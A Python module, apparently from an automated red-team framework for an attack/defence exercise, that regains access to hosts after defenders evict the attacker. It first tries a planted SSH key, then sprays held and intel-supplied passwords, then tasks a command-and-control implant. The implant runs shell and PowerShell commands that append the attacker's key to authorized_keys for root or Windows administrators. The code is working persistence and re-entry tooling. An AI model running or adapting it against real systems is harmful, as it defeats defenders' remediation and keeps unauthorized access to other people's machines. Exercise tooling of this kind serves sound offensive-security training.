"""reestablish — get back onto a box we lost, cheapest mechanism first.

The eviction-recovery effect: v1's `foothold_ssh` plus the re-entry rungs its
director walked after blue evicted us (held creds -> spray -> whatever channel
still stands). Blue evicts by rotating a password, deleting a key, hardening
sshd or dropping a firewall rule; each of those closes exactly one door, so the
mechanisms are tried in ascending order of what they cost us and how loud they
are:

1. ``key``      — the private half of the key the persistence family planted
                  (``ctx.ssh.reentry_key``) and any key credential world already
                  holds for this box. Quiet, needs no password, and it survives
                  the rotation that took the password path away — which is why
                  it goes first (v1's transport carried the same key fallback).
2. ``password`` — the credentials world already holds for this box, then intel's
                  per-box ground truth and the generic pool. Bounded by
                  `cred_spray_max` and by the gate's per-login retry counter.
3. ``c2``       — last resort: with a LIVE channel, task the agent to put our
                  public half back into the account's authorized_keys and then
                  verify the foothold over SSH with the key. Blue who closes the
                  login path but leaves the channel standing has closed one door
                  and left another open.

The C2 step is tasking, not planting: the payload/implant logic lives in `c2/`
(`implant.py`, `effects/implant_channel.py`) and is not re-implemented here. With
no live channel this effect says so and returns ``ok=False`` naming
`implant_channel` — a channel that is not there is that effect's job.

Nothing is claimed that was not verified on the wire: each mechanism ends with a
real login (v1's `ssh_ok` alone reported access on boxes where it could not
usefully work), and the key re-arm records its mutation with the artifact and the
undo even when the verification that follows fails (``installed=True``) — a record
gated on the verification disappears exactly when it is most needed.
"""

import shlex
from pathlib import Path

from ..errors import PolicyError
from .base import Effect, Result, register
from .spray_access import (candidate_pairs, is_windows_box, limits_of, probe_login,
                           sweep, sweep_summary)

# The backup that makes the key re-arm undoable by COPY (takedown's CONF_SUFFIX
# precedent: the original is always still on the box, nothing is edited in place).
KEY_BACKUP_SUFFIX = ".tlaloc-bak"

# How many of intel's generic accounts to try a key for after the box's own.
MAX_KEY_USERS = 5

REARM_MARKER = "TLALOC_REARM"

# Windows admin logins read ONE key list, whoever the account is.
WINDOWS_KEY_PATH = r"$env:ProgramData\ssh\administrators_authorized_keys"

# Mechanisms in the order they are tried (v1's re-entry ladder, one module).
MECHANISMS = ("key", "password", "c2")


# --- recovery material ---------------------------------------------------------

def account_order(ctx, ip):
    """Accounts to try a held key for, most likely first.

    nakon's machine account (the account the box was built with), the box's own
    primary account, root on Linux (the key family can land there), then intel's
    candidate users — bounded, because every extra account is another probe.
    """
    windows = is_windows_box(ctx, ip)
    hints = ctx.intel.hints_for(ip) or {}
    out = []
    for user in (hints.get("user"),
                 "Administrator" if windows else ctx.intel.box_username()):
        if user:
            out.append(str(user))
    if not windows:
        out.append("root")
    for user in (ctx.intel.candidate_users() or [])[:MAX_KEY_USERS]:
        if user:
            out.append(str(user))
    return list(dict.fromkeys(out))


def reentry_key(ctx):
    """The private half of the planted key, when red01 has it (persist sshkey)."""
    key = getattr(ctx.ssh, "reentry_key", None)
    return str(key) if key else None


def key_candidates(ctx, ip):
    """[(user, key_path)] — key credentials world holds, then the reentry key."""
    out = []
    for cred in ctx.world.valid_creds(ip):
        if cred.get("key_path"):
            out.append((str(cred["user"]), str(cred["key_path"])))
    key = reentry_key(ctx)
    if key:
        for user in account_order(ctx, ip):
            out.append((user, key))
    return list(dict.fromkeys(out))


def password_candidates(ctx, ip):
    """[(user, password)] — credentials we hold for this box, then intel's."""
    out = [(str(cred["user"]), str(cred["password"]))
           for cred in ctx.world.valid_creds(ip) if cred.get("password")]
    out.extend(candidate_pairs(ctx, ip))
    return list(dict.fromkeys(out))


def recovery_material(ctx, ip):
    """True when ANY mechanism could plausibly work on this box."""
    return bool(ctx.world.valid_creds(ip) or reentry_key(ctx) or ctx.c2 is not None
                or candidate_pairs(ctx, ip))


# --- the live channel ----------------------------------------------------------

def live_channel(ctx, ip, box_id=None):
    """(box_id, callback record) for a channel inside the freshness window.

    Same evidence rule as `task_channel`: a callback row with a fresh `seen_at`
    is liveness; a row without one is not.
    """
    if ctx.c2 is None:
        return None, None
    from .implant_channel import box_id_for
    key = box_id_for(ctx, ip, box_id)
    try:
        callbacks = ctx.c2.callbacks() or {}
    except Exception:                    # a C2 API fault is a missing channel
        return None, None
    record = callbacks.get(key) or callbacks.get(ip)
    if not record or not record.get("seen_at"):
        return None, None
    max_age = float((ctx.cfg.get("c2") or {}).get("callback_max_age_sec", 120) or 120)
    if (ctx.now() - float(record["seen_at"])) > max_age:
        return None, None
    return key, record


# --- the key re-arm ------------------------------------------------------------

def public_half(key_path):
    """The public half of `key_path` (`<key>.pub`, or the file when it IS the
    public key), one line, or None when red01 has no public half to plant."""
    if not key_path:
        return None
    for path in (Path(f"{key_path}.pub"), Path(str(key_path))):
        try:
            text = path.read_text(encoding="utf-8", errors="replace").strip()
        except OSError:
            continue
        if text.startswith(("ssh-", "ecdsa-", "sk-")):
            return text.splitlines()[0].strip()
    return None


def linux_key_path(user):
    home = "/root" if str(user) == "root" else f"/home/{user}"
    return f"{home}/.ssh/authorized_keys"


def rearm_command(windows, user, pub):
    """(command, key-file path) for putting our public half back.

    Agent-native PowerShell/bash: a C2 task is executed by the agent itself, not
    through cmd.exe, so there is no `winexec` wrap here (the wrap belongs to the
    SSH-to-Windows path — see `exec/winexec.py`). The existing file is COPIED
    before the append, which is what makes the undo a copy rather than a
    hand-edited deletion.
    """
    if windows:
        path = WINDOWS_KEY_PATH
        cmd = (f'Copy-Item -Path "{path}" -Destination "{path}{KEY_BACKUP_SUFFIX}" '
               f'-Force -ErrorAction SilentlyContinue; '
               f'Add-Content -Path "{path}" -Value \'{pub}\' -ErrorAction Stop; '
               f'Write-Output {REARM_MARKER}')
        return cmd, path
    path = linux_key_path(user)
    home = path[: -len("/.ssh/authorized_keys")]
    key = shlex.quote(pub)
    cmd = (f"mkdir -p {home}/.ssh; "
           f"cp -a {path} {path}{KEY_BACKUP_SUFFIX} 2>/dev/null; "
           f"grep -qF {key} {path} 2>/dev/null || echo {key} >> {path}; "
           f"chmod 700 {home}/.ssh; chmod 600 {path}; "
           f"chown -R {user} {home}/.ssh 2>/dev/null; "
           f"echo {REARM_MARKER}")
    return cmd, path


def rearm_restore(windows, path, pub):
    """The undo: put the pre-rearm file back, then drop the copy."""
    if windows:
        return [f'Copy-Item -Path "{path}{KEY_BACKUP_SUFFIX}" -Destination "{path}" '
                f'-Force',
                f'Remove-Item -Path "{path}{KEY_BACKUP_SUFFIX}" -Force '
                f'-ErrorAction SilentlyContinue',
                f"# the appended line is ours only: {pub.split()[0]} {pub.split()[1][:16]}…"]
    return [f"cp -a {path}{KEY_BACKUP_SUFFIX} {path}",
            f"rm -f {path}{KEY_BACKUP_SUFFIX}",
            f"# the appended line is ours only: {pub.split()[0]} {pub.split()[1][:16]}…"]


@register
class Reestablish(Effect):
    id = "reestablish"
    name = "re-establish a foothold after eviction"
    description = ("Regain access to a box we have lost, cheapest mechanism first: a "
                   "held key (the planted reentry key survives password rotation), "
                   "then a password we already hold or intel's per-box candidates, "
                   "then — last resort — the live C2 channel to put the key back and "
                   "verify it. Use it when the box has no foothold: evicted by blue, "
                   "or cold at the start of the event. Every mechanism ends in a real "
                   "login; nothing is claimed that was not verified on the wire.")
    params = {
        "ip": {"type": "str", "required": True, "desc": "target box"},
    }
    tags = frozenset({"access"})
    needs = {"foothold": False, "root": False, "c2": False, "os": "any"}

    def check(self, ctx, params):
        super().check(ctx, params)
        ip = params["ip"]
        if not recovery_material(ctx, ip):
            raise PolicyError(f"nothing to re-establish {ip} with — no held credential, "
                              "no reentry key, no candidate credential and no C2 layer")
        if ctx.world.failure_count(self.id, ip) >= 3:
            raise PolicyError(f"reestablish already failed 3x on {ip} — stop grinding "
                              "this box; work another target")

    def run(self, ctx, params):
        ip = params["ip"]
        windows = is_windows_box(ctx, ip)
        failures = []
        for name, attempt in (("key", self._by_key),
                              ("password", self._by_password)):
            outcome = attempt(ctx, ip, windows)
            if outcome.ok:
                return outcome
            failures.append(f"{name}: {outcome.detail}")

        outcome = self._by_channel(ctx, ip, windows)
        if outcome.ok or outcome.installed:
            # The box changed (key re-armed): that record must survive even when
            # the foothold itself was not proven.
            return outcome
        failures.append(f"c2: {outcome.detail}")
        return Result(False, f"{ip}: no path back onto the box — " + "; ".join(failures),
                      data={"mechanisms_tried": list(MECHANISMS)})

    # -- mechanism 1: a held key -------------------------------------------------

    def _by_key(self, ctx, ip, windows):
        candidates = key_candidates(ctx, ip)
        if not candidates:
            return Result(False, f"no key material for {ip} (no reentry key on red01, "
                                 "no key credential in world)")
        cap, timeout, delay = limits_of(ctx)
        outcome = sweep(ctx, ip, [(user, "", key) for user, key in candidates],
                        windows, cap=cap, timeout=timeout, delay=delay)
        found = outcome["found"]
        if found:
            return self._landed(ctx, ip, found, windows, "key")
        return Result(False, sweep_summary("no held key authenticates", ip, outcome),
                      data={"attempts": outcome["attempts"]})

    # -- mechanism 2: a held (or intel-known) password ---------------------------

    def _by_password(self, ctx, ip, windows):
        candidates = password_candidates(ctx, ip)
        if not candidates:
            return Result(False, f"no password candidate for {ip} (world holds none "
                                 "and intel knows none)")
        cap, timeout, delay = limits_of(ctx)
        outcome = sweep(ctx, ip, [(user, password, None)
                                  for user, password in candidates],
                        windows, cap=cap, timeout=timeout, delay=delay)
        found = outcome["found"]
        if found:
            return self._landed(ctx, ip, found, windows, "password")
        return Result(False, sweep_summary("no held or intel password authenticates",
                                           ip, outcome),
                      data={"attempts": outcome["attempts"]})

    # -- mechanism 3: the live channel (last resort) -----------------------------

    def _by_channel(self, ctx, ip, windows):
        box_id, _record = live_channel(ctx, ip)
        if box_id is None:
            return Result(False, f"{ip} has no live C2 channel — re-planting the "
                                 "channel is implant_channel's job, not this effect's")
        key = reentry_key(ctx)
        pub = public_half(key)
        if not pub:
            return Result(False, f"a live channel exists on {ip} but red01 holds no "
                                 "reentry key pair to re-arm with (the persist sshkey "
                                 "family plants that key)")
        user = account_order(ctx, ip)[0]
        command, path = rearm_command(windows, user, pub)
        timeout = int((ctx.cfg.get("c2") or {}).get("task_timeout_sec", 120) or 120)
        try:
            outcome = ctx.c2.task(box_id, command, timeout=timeout)
        except Exception as exc:              # a C2 fault is a failed mechanism
            return Result(False, f"C2 tasking failed on {box_id}: "
                                 f"{type(exc).__name__}: {exc}")
        if not outcome.get("ok"):
            return Result(False, f"the C2 re-arm did not run on {ip}: "
                                 f"{outcome.get('detail') or 'no output'}",
                          data={"box_id": box_id})

        artifacts = [{"ip": ip, "kind": "access-key-rearm",
                      "detail": (f"reentry key put back for {user} through the live "
                                 f"channel ({box_id})"),
                      "check_cmd": None, "paths": [path]}]
        restore = {"recipe": rearm_restore(windows, path, pub), "secrets": None}
        # Verify with the SAME probe the two earlier mechanisms used: the task
        # being accepted says the agent ran it, not that we can log in.
        status, who, why = probe_login(ctx, ip, user, "", windows, key_path=key,
                                       timeout=limits_of(ctx)[1])
        if status != "ok":
            detail = (f"the key was re-armed on {ip} (channel {box_id}) but a key login "
                      f"for {user} still fails — the foothold is not proven")
            if why:
                detail += f" ({why})"
            return Result(False, detail,
                          data={"box_id": box_id, "task_id": outcome.get("task_id"),
                                "user": user, "key_path": key, "path": path},
                          artifacts=artifacts, restore=restore, installed=True)

        found = {"user": user, "password": "", "who": who, "key_path": key}
        result = self._landed(ctx, ip, found, windows, "c2")
        result.detail = (f"foothold on {ip} re-established through the live channel "
                         f"({box_id}) as {user}, key auth verified")
        result.data.update({"box_id": box_id, "task_id": outcome.get("task_id"),
                            "path": path})
        result.artifacts = artifacts
        result.restore = restore
        return result

    # -- the record ---------------------------------------------------------------

    def _landed(self, ctx, ip, found, windows, mechanism):
        user, password = found["user"], found.get("password") or ""
        key_path = found.get("key_path")
        source = f"{self.id}:{mechanism}"
        ctx.world.add_cred(user, password, source, ip, key_path=key_path)
        ctx.world.add_foothold(ip, user, password, "user", windows=windows,
                               key_path=key_path)
        ctx.world.note(ip, f"access: foothold re-established as {user} ({mechanism})")
        who = found.get("who") or user
        return Result(True,
                      f"foothold on {ip} re-established as {user} via {mechanism} "
                      f"(box calls it {who})",
                      data={"mechanism": mechanism, "user": user, "password": password,
                            "who": who, "key_path": key_path, "source": source})
